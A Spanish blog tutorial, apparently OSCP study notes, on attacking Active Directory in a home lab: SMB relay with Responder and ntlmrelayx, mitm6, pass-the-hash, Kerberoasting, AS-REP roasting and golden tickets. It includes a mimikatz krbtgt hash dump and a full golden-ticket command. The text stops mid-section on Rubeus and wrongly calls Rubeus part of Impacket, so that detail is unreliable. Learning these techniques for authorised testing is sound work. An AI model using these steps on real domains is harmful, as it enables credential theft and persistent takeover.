---
title: Active Directory
published: true
categories: [Windows]
tags: [OSCP, AD, Tips]
---

<img src="/assets/Tips/AD/ad.png">

En el post de hoy voy a explicar los ataques más comunes que se pueden acontecer en un entorno de **Directorio Activo**. Todas estas técnicas se desarrollan sobre un entorno controla con una máquina `Windows Server 2016` como `Domain Controller` y dos equipos de usuario de dominio con `Windows 10`. Para saber cómo montar este lab podéis ver el vídeo en Youtube [PENTESTING EN ENTORNOS EMPRESARIALES](https://www.youtube.com/watch?v=-bNb4hwgkCo&t=2569s) dónde nuestro querido profesor **S4vitar** nos lo explica en detalle. Vamos al lío!

- **Enumeración con Crackmapexec**
- **SMB Relay**
- **Pass The Hash**
- **Obteniendo Información de Usuarios**
- **Enumeración LDAP**
- **Kerbrute**
- **Kerberoasting**
- **AS-REP Roast**
- **Golden Ticket**
- **Rubeus - Kerberoasting**
- **Rubeus - AS-REP Roast**
- **Archivos SCF**
- **Bloodhound & neo4j**

## Enumeración con Crackmapexec

* * *

### Información de Red

Podemos usar `crackmapexec` para enumerar los equipos del dominio y verificar si tienen **SMB** firmado.

<img src="/assets/Tips/AD/netenum.png">

### Dumpeando la SAM

Si conocemos las credenciales de un usuario, podríamos dumpear la `sam`:

<img src="/assets/Tips/AD/sam.png">

Aquí podemos ver que el usuario `jcampo` tiene privilegios sobre `ramlux`, lo cual es bastante peligroso y más si la contraseña de jcampo es muy débil.

### Enumeración de Recursos Compartidos

Con el parámetro `--shares` podemos enumerar los recursos compartidos y el tipo de permisos (Lectura o Escritura) que tenemos sobre los mismos.

<img src="/assets/Tips/AD/shares.png">

### Spidering

Existe un módulo en crackmapexec llamado `spider_plus`. Este módulo rastrea todos los recursos compartidos y directorios dentro de ellos de forma recursiva y le devuelve una salida limpia que le indica todos los archivos en cada recurso compartido que puede ver. Realmente quita todo el esfuerzo que necesita para ir a cada recurso compartido y enumerar todos los directorios manualmente. El comando debería ser algo como esto:

<img src="/assets/Tips/AD/spider.png">

### Authentication Sprying

Con crackmapexec se podría realizar un ataque de `password sprying` para ver a qué sistemas puede conectarse:

<img src="/assets/Tips/AD/spray.png">

### Habilitar RDP

Si tenemos credenicales de administrador podemos habilitar el **RDP** en todos los equipos del dominio.

<img src="/assets/Tips/AD/rdp.png">

## SMB Relay

* * *

### Qué es?

Un ataque de retransmisión **SMB** es donde un atacante captura un hash `NTLM` de un usuario y lo retransmite a otra máquina en la red. Hacerse pasar por el usuario y autenticarse contra **SMB** para obtener acceso a shell o archivos.

### Prerequisitos

- **SMB** no firmado
- Debe estar en la red local
- Las credenciales de usuario deben tener acceso de inicio de sesión remoto, por ejemplo: Administrador local a la máquina de destino o miembro del grupo de administradores de dominio.

### Firma SMB

La firma **SMB** verifica el origen y la autenticidad de los paquetes **SMB**. Efectivamente, esto evita que ocurran ataques de retransmisión MITM SMB. Si esto está habilitado y es necesario en una máquina, no podremos realizar un ataque de retransmisión **SMB**.

Podemos verificar si el **SMB** está firmado con `crackmapexec`.

<img src="/assets/Tips/AD/cme.png">

Como muestran los resultados el **SMB** no está firmado por lo que procedemos a realizar el ataque con la herramienta `Responder`.

[Responder](https://github.com/SpiderLabs/Responder) un envenenador `LLMNR`, `NBT-NS` y `MDNS`. Responderá a consultas específicas de `NBT-NS (NetBIOS Name Service)` según el sufijo de su nombre. De forma predeterminada, la herramienta solo responderá a la solicitud del servicio del servidor de archivos, que es para **SMB**.

Se ejecuta de la siguiente forma:

```bash
❯ python3 Responder.py -I ens33 -rdw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens33]
    Responder IP               [192.168.150.128]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-J4FBRZSWGF3]
    Responder Domain Name      [56XD.LOCAL]
    Responder DCE-RPC Port     [45309]

[+] Listening for events...
```

Desde la máquina del usuario `jcampo` simulamos el acceso a un recurso compartido a nivel de red `\\SQLServer\bd`.

<img src="/assets/Tips/AD/sqlaccessyorch.png">

Observamos en el responder que hemos capturado el hash `NTLMv2` del usuario `jcampo`

<img src="/assets/Tips/AD/yorchntlm.png">

De la misma forma si los usuarios `Asministrador` y `ramlux` accedieran a algún recurso a nivel de red capturaríamos sus respectivos hashes `NTMLv2`

<img src="/assets/Tips/AD/hashadmin.png">

<img src="/assets/Tips/AD/hashramlux.png">

En este punto podemos copiar los hashes en un archivo y tratar de crackearlos por fuerza bruta de manera offline.

<img src="/assets/Tips/AD/crackhashes.png">

### IPv4

En determinadas ocasiones puede ocurrir que algunos usuarios tienen privilegios sobre otros usuarios. En nuestro caso el usuario `jcampo` tiene privilegios de administrador sobre el equipo del usuario `ramlux`. Con las credenciales del usuario `jcampo` y mediante la técnica de **Password Sprying** que aplicaremos sobre todos los quipos de la red, observamos mediante la etiqueta `(Pwn3d!)` que el usuario `jcampo` tiene máximos privilegios sobre el equipo de `ramlux`.

<img src="/assets/Tips/AD/passwspry.png">

Para realizar este ataque debemos modificar la configuración del archivo `Responder.conf` de la siguiente forma:

<img src="/assets/Tips/AD/conf.png">

Vamos a fijar nuestro objetivo en `PC-RAMLUX` por lo que enumeramos los equipos existentes en la red para ver qué IP tiene este equipo.

<img src="/assets/Tips/AD/netenum.png">

Guardamos en un archivo `targets.txt` la IP de nuestra víctima

<img src="/assets/Tips/AD/target.png">

En este punto arrancamos el `responder`.

```bash
❯ python3 Responder.py -I ens33 -rdw
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens33]
    Responder IP               [192.168.150.128]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-J4FBRZSWGF3]
    Responder Domain Name      [56XD.LOCAL]
    Responder DCE-RPC Port     [45309]

[+] Listening for events...
```

Acto seguido ejecutamos la herramienta `ntlmrelayx.py` de la siguiente forma:

```bash
❯ ntlmrelayx.py -tf targets.txt -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```

Como `jcampo` tiene privilegios de administrador sobre `ramlux`, podemos tomar ventaja de ello accediendo a un recurso que no existe.

<img src="/assets/Tips/AD/sqlaccessyorch.png">

Observamos la respuesta en `ntlmrelayx.py`

<img src="/assets/Tips/AD/relayresponse.png">

Hemos conseguido dumpear la `SAM` y obtener los hashes de los usuarios. En este punto podríamos realizar un ataque `Pass The Hash` con los hashes obtenidos. Además de esta técnica, se pueden realizar otras con las que podríamos ejecutar comandos en el sistema. Para ello procedemos de la siguiente forma:

Primero debemos clonarnos el repositorio de [nishang](https://github.com/samratashok/nishang). Nos copiamos a nuestro directorio de trabajo el recurso `Invoke-PowerShellTcp.ps1` que se encuentra en la carpeta `Shells` del repositorio.

<img src="/assets/Tips/AD/copynishang.png">

Editamos el recurso y agregamos el siguiente contenido al final del script, donde la IP es la de nuestra máquina atacante:

<img src="/assets/Tips/AD/scriptmod.png">

Lo servimos con un servidor HTTP y arrancamos un listener con netcat en el puerto anteriormente indicado en el script:

<img src="/assets/Tips/AD/webnetcat.png">

En este punto ejecutamos la herramienta `ntlmrelayx.py` y `Responder.py` de la siguiente forma:

<img src="/assets/Tips/AD/responderntlm.png">

Nuevamente simulamos el acceso a un recurso de red desde la máquina de `jcampo` y observamos en nuestro listener que hemos ganado acceso a la máquina de `ramlux` con máximos privilegios.

<img src="/assets/Tips/AD/relaysuccess.png">

### IPv6

Hemos comprobado el peligro de que el SMB no esté firmado. Muchas empresas firman únicamente los servidores críticos (DC, Servidor BD, etc..) sin embargo o se firman todos los equipos o se sigue estando en peligro. En estaciones de trabajo se pueden almacenar en memoria hashes de usuarios administradores del dominio por lo que supone un riesgo no firmar el SMB en estos equipos.

Nos podemos encontrar en la situación en que por **IPv4** esté mitigado el problema, sin embargo se olvidan de hacerlo por **IPv6**. Con IPv6 podemos envenenar el dominio de la empresa entero con `mitm6` y con `ntlmrelayx` jugar con `proxychains` para crear un túnel y lograr ejecutar el comando que queramos. No hace falta ni saber la contraseña.

Iniciamos `mitm6` de la siguiente manera para 'envenenar' el dominio:

<img src="/assets/Tips/AD/mitm6.png">

Seguidamente ejecutamos `ntlmrelayx.py` de la siguiente forma marcando como objetivo la IP del equipo de `ramlux`:

```bash
❯ ntlmrelayx.py -6 -wh 192.168.150.134 -t smb://192.168.150.132 -socks -debug -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack MSSQL loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening at port 1080
[*] MSSQL Socks Plugin loaded..
[*] SMB Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Al tener el usuario `jcampo` privilegios sobre el equipo de `ramlux`, cuando éste acceda a algun recurso a nivel de red observamos como se le asigna `AdminStatus` a `TRUE` en la repuesta de `ntlmrelayx.py`

<img src="/assets/Tips/AD/socks.png">

Observamos en el archivo `/etc/proxychains.conf` que estamos en escucha en el equipo local por el puerto 1080.

<img src="/assets/Tips/AD/proxychains.png">

Con crackmapexec a través de proxychains, verificamos que se está aplicando un relaying de las credenciales. Observamos que le podemos pasar cualquier contraseña que funciona de igual manera y vemos la etiqueta `Pwn3d!`.

<img src="/assets/Tips/AD/pwned.png">

## Pass The Hash

Si logramos credenciales de administrador es recomendable dumpear el **NTDS** para obtener todos los hashes del directorio activo.

<img src="/assets/Tips/AD/ntds.png">

Teniendo los hashes de los usuarios no hace falta conocer la contraseña en texto claro. Podemos utilizar la técnica de **Pass The Hash** para ganar acceso al sistema. Para ello podemos utilizar la herramienta **wmiexec.py** de la siguiente forma:

<img src="/assets/Tips/AD/wmiexec.png">

Alternativamente podemos utilziar la herramienta **impacket-psexec.py**:

<img src="/assets/Tips/AD/psexec.png">

## Obtener Información de Usuarios

A veces algunos usuarios pueden tener información sensible en su descripción como contraseñas, emails, etc. Como atacantes debemos enumerar **todo**. En esta sección utilizaremos la herramienta `rpclient`. Si está acticada la `null session` se debería deshabilitar esta opción de inmediato. Si no está disponible el atacante debe tener credenciales para poder enumerar a través de esta herramienta.

Con el comando `enumdomusers` podemos enumarar los usuarios del dominio:

<img src="/assets/Tips/AD/enumdomusersname.png">

De la siguiente forma podemos extraer el `rid` de cada usuario:

<img src="/assets/Tips/AD/enumdomusersrid.png">

Con la siguiente regex obtenemos la descripción de cada usuario en función de su rid:

<img src="/assets/Tips/AD/queryuser.png">

Una cosa muy importante a realizar es enumerar todos los usuarios administradores del dominio.

```bash
❯ rpcclient -U "s4vicorp.local\jcampo%Password1" 192.168.150.129
rpcclient $> enumdomgroups
group:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
group:[Admins. del dominio] rid:[0x200]
group:[Usuarios del dominio] rid:[0x201]
group:[Invitados del dominio] rid:[0x202]
group:[Equipos del dominio] rid:[0x203]
group:[Controladores de dominio] rid:[0x204]
group:[Administradores de esquema] rid:[0x206]
group:[Administradores de empresas] rid:[0x207]
group:[Propietarios del creador de directivas de grupo] rid:[0x208]
group:[Controladores de dominio de sólo lectura] rid:[0x209]
group:[Controladores de dominio clonables] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Administradores clave] rid:[0x20e]
group:[Administradores clave de la organización] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> enumdomgroups
group:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
group:[Admins. del dominio] rid:[0x200]
group:[Usuarios del dominio] rid:[0x201]
group:[Invitados del dominio] rid:[0x202]
group:[Equipos del dominio] rid:[0x203]
group:[Controladores de dominio] rid:[0x204]
group:[Administradores de esquema] rid:[0x206]
group:[Administradores de empresas] rid:[0x207]
group:[Propietarios del creador de directivas de grupo] rid:[0x208]
group:[Controladores de dominio de sólo lectura] rid:[0x209]
group:[Controladores de dominio clonables] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Administradores clave] rid:[0x20e]
group:[Administradores clave de la organización] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
	rid:[0x453] attr:[0x7]
	rid:[0x454] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrador
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Cuenta integrada para la administración del equipo o dominio
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	mar, 06 jun 2023 12:39:03 CEST
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	vie, 02 jun 2023 11:59:47 CEST
	Password can change Time :	sáb, 03 jun 2023 11:59:47 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000011
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser 0x453
	User Name   :	test
	Full Name   :	test
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Password temporal mypassword123#
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	mar, 06 jun 2023 12:21:29 CEST
	Password can change Time :	mié, 07 jun 2023 12:21:29 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x453
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser 0x454
	User Name   :	svc_sqlservice
	Full Name   :	SCV_SQLservice
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	mar, 06 jun 2023 12:39:44 CEST
	Password can change Time :	mié, 07 jun 2023 12:39:44 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```

Si observamos el puerto 5985 abierto con el servicio [Winrm](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) y disponemos de credenciales válidas podeos conectarnos a la máquina víctima con la herramienta **evil-winrm**:

<img src="/assets/Tips/AD/winrm.png">

## Enumeración LDAP 

Otra herramienta muy útil es `ldapdomaindump`. Si tenemos credenciales válidas podemos extraer mucha información útil del dominio y levatandando un servidor HTTP podemos examinar de una forma cómoda la información capturada.

<img src="/assets/Tips/AD/ldap.png">

<img src="/assets/Tips/AD/ldapweb.png">

## Kerbrute

Kerbrute es una herramienta útil para enumerar usuarios de dominio a través de kerberos. Para instalarlo os podéis clonar el repositorio de [ropnop](https://github.com/ropnop/kerbrute). Para enumerar los usuarios sería de la siguiente forma:

<img src="/assets/Tips/AD/kerbrute.png">

## Kerberoasting

Kerberoasting es una técnica que podemos usar para apuntar a cuentas de servicio en un entorno de Windows Active Directory. Aprovecha la forma en que funciona la autenticación Kerberos para los servicios que utilizan Kerberos para obtener vales de servicio.

Así es como funciona Kerberoasting:

- Comenzamos por identificar las cuentas de servicio en el entorno de Active Directory. Estas cuentas de servicio generalmente se usan para ejecutar varios servicios o aplicaciones.

- A continuación, consultamos Active Directory en busca de cuentas de servicio que tengan nombres principales de servicio (SPN) asociados. Los SPN identifican de forma única los servicios registrados en el dominio.

- Una vez que tenemos una lista de cuentas de servicio con SPN, solicitamos un ticket de servicio (TGS) para cada una de estas cuentas. Para ello, utilizamos nuestra cuenta de usuario habitual y proporcionamos el SPN de la cuenta de servicio a la que queremos apuntar.

- El controlador de dominio emite un ticket de servicio encriptado con la contraseña de la cuenta de servicio, que no conocemos.

- Extraemos los tickets de servicio cifrados y los guardamos en un archivo.

- Ahora, podemos usar una herramienta como **john** para forzar la contraseña de la cuenta de servicio sin conexión a la fuerza bruta y obtener la contraseña de texto sin formato. john realiza un ataque de diccionario o de fuerza bruta contra el ticket de servicio encriptado para descifrar la contraseña.

Con la contraseña de texto sin formato en nuestro poder, potencialmente podemos acceder a otros sistemas o servicios que usan las mismas credenciales. Esto puede conducir a una mayor escalada de privilegios y un movimiento lateral dentro de la red.

Para este ataque utilizaremos la herramienta **GetUserSPN.py**:

<img src="/assets/Tips/AD/getuserspns.png">

Si le añadimos el parámetro `request` realizará una petición de un `Ticket Granted Service`:

<img src="/assets/Tips/AD/tgs.png">

Guardamos el hash en un archivo y con la herramienta `john` procedemos a crackear el hash:

<img src="/assets/Tips/AD/john.png">

Verificamos con `crackmapexec` que el usuario es administrador del dominio:

<img src="/assets/Tips/AD/isadmin.png">

## AS-REP Roast

Este tipo de ataque busca usuarios sin necesidad de `Kerberos pre-auth`. Eso significa que puede enviar un `AS_REQ` a s4vicorp.local con una lista de usuarios, recibiendo un mensaje `AS_REP`. Este mensaje contiene un hash de la contraseña del usuario. Con esta contraseña, podríamos intentar descifrarla sin conexión.

Con rpcclient enumeramos todos los usuarios del dominio y creamos un diccionario personalizado:

<img src="/assets/Tips/AD/users.png">

Con la herramienta `GetNPUsers.py` ejecutamos de la siguiente forma y obervamos que obtenemos el hash del usuario `svc_sqlservice`:

<img src="/assets/Tips/AD/getnp.png">

Nos copiamos el hash en un archivo y con john obtenemos la contraseña en texto claro:

<img src="/assets/Tips/AD/john.png">

## Ataque Golden Ticket

Para este tipo de ataque, nosotros, como atacantes, necesitaríamos explotar el sistema de autenticación de tickets Kerberos, que se usa comúnmente en entornos de redes corporativas. Crearíamos un ticket falso con un período de validez extremadamente largo, conocido como **Golden Ticket**. Para generar este ticket falsificado, necesitaríamos acceso a la clave de cifrado de la cuenta de dominio, también conocida como **domain account master key** o **domain encryption key**. Esta clave se puede obtener comprometiendo un controlador de dominio de Windows y extrayéndolo de la memoria del sistema.

Una vez que hayamos creado con éxito el Golden Ticket, podemos utilizarlo para autenticarnos dentro del sistema Kerberos sin necesidad de credenciales de usuario genuinas. Este ataque nos otorgaría acceso completo y privilegios de administrador en la red comprometida.

Para este ataque, utilizaremos las siguientes herramientas:

- Ticketer
- Rubeus
- Bloodhound
- neo4j
- Mimikatz

### Método 1

Para desplegar este ataque en primer lugar creamos un directorio en `C:\Windows\Temp\test` y subimos el binario de 64 bits `mimikatz.exe` al DC desde nuestra máquina de atacante:

<img src="/assets/Tips/AD/mimi.png">

Seguimos ejecutando el binario e introduciendo el comando `lsadump::lsa /inject /name:krbtgt` con el objetivo de dumpear la información del usuario `krbtgt` para poder efectuar un `Pass the Ticket`.

```bash
C:\Windows\Temp\test> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

 
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # Domain : S4VICORP / S-1-5-21-3555876161-3548447794-446757401

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 6ddc8cad151c417205e1097522d904c2
    LM   : 
  Hash NTLM: 6ddc8cad151c417205e1097522d904c2
    ntlm- 0: 6ddc8cad151c417205e1097522d904c2
    lm  - 0: d1fbd2eee29ce5d6fc5ed6a092586bb9

 * WDigest
    01  a4b3f8898c9f2ea38c2972dd45638867
    02  47283d14f0d524060d8b92f33f196970
    03  7cd81087b46b97fddd8a7798303d3a66
    04  a4b3f8898c9f2ea38c2972dd45638867
    05  47283d14f0d524060d8b92f33f196970
    06  2c1d00f661abbf620a7d3c2c15f7d97a
    07  a4b3f8898c9f2ea38c2972dd45638867
    08  daea0c40de97eb5e26bf56d7e4f1837a
    09  daea0c40de97eb5e26bf56d7e4f1837a
    10  19b7594bf1b92ae476fdafe1b7bcf660
    11  cfa03c5154ec551fb89be41b0842432a
    12  daea0c40de97eb5e26bf56d7e4f1837a
    13  cbad7014e9ab940aabb9664ea4b8df4d
    14  cfa03c5154ec551fb89be41b0842432a
    15  6d2502fa25ad42718ffbd88b8dcd4696
    16  6d2502fa25ad42718ffbd88b8dcd4696
    17  3f74276cf79a5456ecf234213f36f936
    18  1987975399b79752dd2a4af0c5046026
    19  049e7e63f3eb9000bf9d39dffcd081fc
    20  e8f3a2a586fea4b7fde20c4ab6a6f92a
    21  39be824f1656cc6126ba58f1837d03bb
    22  39be824f1656cc6126ba58f1837d03bb
    23  faa52925112ef5c0d6c8b95e297b9505
    24  94f82526ce4e2ca26aa3c0fdfaf6cd39
    25  94f82526ce4e2ca26aa3c0fdfaf6cd39
    26  fc92db1847b73d236caeff14abc91726
    27  6e9f96b5c5c76f9eacce37025074a222
    28  f9b2834ed10faf3f19b13d1349be7ea9
    29  1e18e344fb3c0205b52f1a0ac3f8a912

 * Kerberos
    Default Salt : S4VICORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : a78ff298e6d3fd8c

 * Kerberos-Newer-Keys
    Default Salt : S4VICORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8737176c552034939bf3c6b979033b099d01befc2aeade7f469644dbe6d7fe0a
      aes128_hmac       (4096) : 863c75d38c639e0920a4944a7e32d026
      des_cbc_md5       (4096) : a78ff298e6d3fd8c

 * NTLM-Strong-NTOWF
    Random Value : 86cfb0a4c8ab92d9367c0833a2814457
```

Guardamos el output del comando en un archivo ya que vamos a necesitar ciertos datos para montar un Golden Ticket. A continuación generamos el ticket con el siguiente comando `kerberos::golden /domain:s4vicorp.local /sid:S-1-5-21-3555876161-3548447794-446757401 /rc4:6ddc8cad151c417205e1097522d904c2 /user:Administrador /ticket:golden.kirbi`

- **/domain**: Dominio
- **/sid**: ID del usuario krbtgt
- **/rc4**: Hash NTLM
- **/user**: El usuario al que quieres impersonar
- **/ticket**: Nombre del ticket

<img src="/assets/Tips/AD/ticket.png">

La ejecución de este comando nos habrá generado un archivo `.kirbi`:

<img src="/assets/Tips/AD/kirbi.png">

Nos descargamos el archivo `golden.kirbi` y a nuestra máquina de atacante:

<img src="/assets/Tips/AD/copykirbi.png">

Para ejecutar el ataque nos conectaremos al equipo de `ramlux` con las credenciales de `Administrador` y procedemos a subir el archivo .kirbi y el binario de `mimikatz.exe` al equipo de `ramlux`:

<img src="/assets/Tips/AD/copykirbi.png">

Observamos que el equipo de `ramlux` no tiene privilegios para listar recursos de `DC-Company`:

<img src="/assets/Tips/AD/denegado.png">

Ejecutamos mimikatz y mediante el comando `kerberos::ptt golden.kirbi` efectuamos un **pass the ticket**:

<img src="/assets/Tips/AD/ptt.png">

En este punto ya podríamos listar contenido de `DC-Company` desde el equipo de `ramlux`:

<img src="/assets/Tips/AD/ok.png">

### Método 2

Para este método utilizaremos la heramienta `ticketer`. Este método nos dará persistencia permanente en el DC. La ejecutamos de la siguiente forma:

<img src="/assets/Tips/AD/ticketer.png">

Los parámetros `nthash` y `domain-sid` son los obetenidos del usuario `krbtgt`.

Este comando se autenticará con el usuario `krbtgt` y solicitará un archivo `.ccache` del caché del Administrador:

<img src="/assets/Tips/AD/ccache.png">

Seguidamente exportamos una variable `KRB5CCNAME` que es igual al archivo `.ccache`:

<img src="/assets/Tips/AD/var.png">

En este punto nos podemos conectar al DC como Administrador sin proporcionar contraseña:

<img src="/assets/Tips/AD/nopass.png">

Aunque el Administrador cambie su contraseña ya que tenemos persistencia absoluta.

## Rubeus - Kerberoasting

La diferencia entre Kerberoasting regular y Rubeus Kerberoasting radica en las herramientas utilizadas para realizar el ataque y las funciones adicionales proporcionadas por Rubeus.

Kerberoasting regular generalmente se refiere a la técnica o concepto general de explotar la vulnerabilidad en Kerberos para extraer y descifrar contraseñas de cuentas de servicio. Implica identificar cuentas de servicio, solicitar tickets de servicio (TGS) para esas cuentas y descifrar fuera de línea los tickets de servicio cifrados para obtener las contraseñas de texto sin formato. El Kerberoasting regular se puede realizar usando varias herramientas y scripts, o incluso manualmente.

Por otro lado, Rubeus es una herramienta específica desarrollada por **Harmj0y** como parte del framework Impacket. Rubeus está diseñado para ayudar en varios ataques relacionados con Kerberos, incluido Kerberoasting. Proporciona funcionalidades y características adicionales destinadas específicamente a simplificar y automatizar el proceso de Kerberoasting. Algunas diferencias y ventajas notables de Rubeus Kerberoasting incluyen:

- **Funcionalidad mejorada**: Rubeus proporciona una funcionalidad integrada para enumerar cuentas de servicio, solicitar tickets de servicio y realizar descifrado fuera de línea. Simplifica los pasos involucrados en el proceso de ataque Kerberoasting.

- **Ataques de diccionario y de fuerza bruta**: Rubeus admite métodos de descifrado de contraseñas tanto basados ​​en diccionario como de fuerza bruta contra los tickets de servicio cifrados. Proporciona opciones para especificar listas de palabras personalizadas y reglas de complejidad de contraseña.

